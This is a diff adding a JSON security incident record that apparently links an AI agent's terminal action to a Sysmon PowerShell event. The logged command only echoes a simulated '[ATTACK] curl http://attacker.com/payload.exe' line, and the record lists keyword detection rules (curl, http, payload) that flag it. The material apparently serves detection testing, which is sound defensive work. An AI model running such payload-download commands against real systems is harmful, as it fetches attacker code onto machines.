@@ -1,0 +1,26 @@
+{
+    "incident_id": "INC-0011",
+    "ai_event": {
+        "agent": "Background Script/AI",
+        "action": "terminal",
+        "timestamp": "2026-06-18T16:44:02.6476609Z"
+    },
+    "sysmon_event": {
+        "EventID": 1,
+        "TimestampUTC": "2026-06-18T16:44:02.6476609Z",
+        "ProcessId": "32088",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe  -Command \"Write-Host \"[ATTACK] curl http://attacker.com/payload.exe\"\"",
+        "ParentProcessId": "37676",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "_correlated": true
+    },
+    "severity": "CRITICAL",
+    "matched_rules": [
+        "Suspicious Keyword: curl",
+        "Suspicious Keyword: http",
+        "Suspicious Keyword: payload",
+        "Process: PowerShell",
+        "Network: Outbound Comm"
+    ]
+}
